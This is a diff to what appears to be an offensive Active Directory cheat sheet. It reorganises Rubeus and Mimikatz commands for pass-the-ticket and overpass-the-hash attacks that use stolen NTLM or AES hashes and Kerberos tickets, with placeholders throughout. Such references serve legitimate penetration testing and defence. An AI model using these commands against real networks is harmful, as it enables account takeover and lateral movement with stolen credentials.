@@ -701,12 +701,7 @@ mimikatz # kerberos::ptt "<ticket.kirbi>"
 - Rubeus Pass-The-Ticket (PTT)
 
 ```
-C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /rc4:<hash> /ptt
-OR
-C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /aes256:<hash> /ptt
-OR
 C:\> Rubeus.exe ptt /ticket:<ticket.kirbi>
-OR
 C:\> Rubeus.exe ptt /ticket:<base64_ticket>
 ```
 
@@ -728,6 +723,13 @@ mimikatz # sekurlsa::pth /domain:<Domain> /user:<username> /ntlm:<hash>
 ```
 # Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't
 C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /aes256:<hash> /nowrap
+```
+
+- Rubeus OverPass-The-Hash (OPTH) -> Rubeus Pass-The-Ticket (PTT)
+
+```
+C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /rc4:<hash> /ptt
+C:\> Rubeus.exe asktgt /domain:<Domain> /user:<username> /aes256:<hash> /ptt
 ```
 
 - Rubeus Sacrificial Process
